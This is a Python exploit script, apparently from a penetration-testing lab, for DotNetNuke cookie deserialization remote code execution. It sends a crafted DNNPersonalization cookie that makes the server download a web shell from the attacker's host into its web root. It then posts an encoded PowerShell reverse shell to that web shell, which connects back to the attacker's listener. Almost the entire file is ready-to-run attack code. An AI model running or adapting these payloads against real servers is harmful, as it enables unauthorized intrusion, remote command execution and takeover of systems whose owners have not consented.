#!/usr/bin/env python3

import requests 
import traceback
import argparse
import subprocess

"""
Example Usage:
/usr/bin/python3 rce_script.py 192.168.45.192 1337
"""


def UploadWebShell(lhost):
    url = "http://dnn:80/dotnetnuke/doesNotExist"
    cookies = {"DNNPersonalization": f"<profile><item key=\"myTableEntry\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ProjectedProperty0><ObjectInstance xsi:type=\"FileSystemUtils\" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">http://{lhost}/cmdasp.aspx</anyType><anyType xsi:type=\"xsd:string\">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>"}
    print("[*]", cookies)
    try:
        print("[*] Uploading the webshell to the traget machine...")
        requests.get(url, cookies=cookies, verify=False)
        print("[+] Webshell uploaded succssfully")
        print("[+] Access your webshell http://dnn/dotnetnuke/cmdasp.aspx")
    except Exception as e:
        print("[-] Error uploading the webshell to the target machine: ", e)
        traceback.print_exc()

def TrgRevShell(lhost, lport):
    revshell = """$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};""" % (lhost, lport)
    with open("powershellcmd.txt", "w") as f:
        f.write(revshell + "\n") # the \n is mandatory
    command = "iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d '\\n'"
    result = subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
    exec = result.stdout

    url = "http://dnn:80/dotnetnuke/cmdasp.aspx"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"__VIEWSTATE": "6nNNF54/v2A/KI8Sl/x05qf1VkiKYeXBHwjcUdrWyeeu5qXB2tVmzzD79KrzGWL10GLaMwMxp4LR9SI1rg4YKyAW6mIJdaR2e2i79w==", "__VIEWSTATEGENERATOR": "2FB6F1FD", "__VIEWSTATEENCRYPTED": '', "__EVENTVALIDATION": "vcyz+GFtqRHRkzLXW6gueKitM2Wj57gmHejPx6OrzkAhN5w2f+0igLHB27A2nf1zVkvjxR7hUIsk7mlUEUlEVhv7QcjdqJvCWSdbEmRdG3TQ8rwR", "txtArg": f"powershell.exe -EncodedCommand {exec}", "testing": "excute"}
    try:
        print("[*] Triggering reverse shell. Check your listener")
        requests.post(url, headers=headers, data=data, verify=False)
        print("[+] Reverse Shell Triggered Successfully.")
    except Exception as e:
        print("[-] Error triggering reverse shell: ", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="DotNetNuke Cookie Deserialization RCE")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    UploadWebShell(args.lhost)
    TrgRevShell(args.lhost, args.lport)


if __name__ == "__main__":
    main()
